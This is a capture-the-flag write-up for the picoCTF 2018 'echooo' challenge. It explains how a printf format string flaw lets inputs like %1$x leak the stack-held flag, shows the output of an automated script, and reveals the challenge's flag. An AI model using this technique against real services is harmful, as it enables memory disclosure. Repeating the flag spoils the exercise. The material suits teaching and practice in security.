# picoCTF2018 - echooo
## Text
> This program prints any input you give it. Can you leak the flag? Connect with nc 2018shell.picoctf.com 46960. [Source](https://github.com/PrinceOfBorgo/picoCTF2018-echooo/blob/master/echo.c).

Port may be different.

## Hints
> If only the program used puts...

## Solution
Connecting to the specified server we are able to enter strings which are then printed to screen.
Analysing the source code provided by picoCTF we can see that the flag is saved in a 64 bytes long buffer and our input is printed to screen using `printf` function accepting only one argument.
This means that we can pass a string containing formatting characters which will read memory from the stack, expecting to find the corresponding arguments.

The script will connect to the server and start sending strings of the format `%1$x`, `%2$x`, `%3x`, ... where `%i$x` will get the `i`th parameter on the stack.
Getting an output corresponding to `pico` means that we started reading the flag buffer, so we can keep reading until we get all 64 bytes of the buffer and returning only the part representing the flag.

## Usage
Simply run `echooo.py` as a python script and insert port to which to connect:
```
$ python3 echooo.py 
picoCTF port: 46960
[+] Opening connection to 2018shell.picoctf.com on port 46960: Done

Looking for flag buffer...

FLAG BUFFER:
b'pico'
b'picoCTF{'
...
...
b'picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}\n\x00\xab\x87\x04\x08\x01\x00\x00\x00\xf4\x10\x8e\xff'
b'picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}\n\x00\xab\x87\x04\x08\x01\x00\x00\x00\xf4\x10\x8e\xff\xfc\x10\x8e\xff'

FLAG:  picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}
```

